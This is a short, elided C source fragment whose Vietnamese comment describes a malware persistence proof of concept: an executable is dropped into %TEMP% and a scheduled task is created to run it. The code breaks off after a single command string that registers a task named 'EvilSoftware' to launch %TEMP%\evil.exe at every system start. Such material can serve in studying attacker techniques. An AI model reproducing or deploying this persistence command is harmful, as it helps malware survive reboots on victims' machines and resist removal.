...
/*
** Mô tả:
** - Tạo Scheduled Task để chạy malware theo thời gian được thiết lập
** PoC:
** - Dropped executable vào thư mục %TEMP%. Sau đó tạo scheduled task chạy tệp này
** - Có thể sử dụng: CreateProcess, ShellExecute hoặc WinExec
** Ref:
** - Execute command using Win32: https://stackoverflow.com/a/31564964
*/
...
int main()
{
	...
	LPSTR		lpCommandLine = L"/C schtasks /create /tn EvilSoftware /tr %TEMP%\\evil.exe /sc ONSTART /f";
